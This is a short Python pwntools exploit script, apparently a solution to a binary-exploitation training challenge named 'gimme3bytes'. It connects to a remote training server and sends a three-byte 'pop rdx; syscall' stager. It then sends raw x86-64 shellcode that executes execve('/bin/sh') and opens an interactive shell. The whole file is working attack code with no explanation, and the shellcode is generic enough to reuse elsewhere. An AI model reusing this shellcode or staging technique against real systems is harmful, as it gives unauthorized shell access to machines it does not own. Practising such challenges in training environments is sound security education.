from pwn import *
context.terminal = ['tmux', 'splitw', '-h']

import time

#r = process("./gimme3bytes") 
r = remote("bin.training.jinblack.it", 2004)

'''
pop rdx
syscall
'''

'''
gdb.attach(r, """
	#brva 0x11e3
	b * (main + 155)
	c
""")
'''


shellcode = b"\xEB\x18\x48\xC7\xC0\x3B\x00\x00\x00\x5F\x48\xC7\xC6\x00\x00\x00\x00\x48\xC7\xC2\x00\x00\x00\x00\x0F\x05\xE8\xE3\xFF\xFF\xFF/bin/sh\x00"

reading = b"\x5A\x0F\x05"


r.send(reading)
time.sleep(1)
r.send(shellcode)

r.interactive()
input("wait")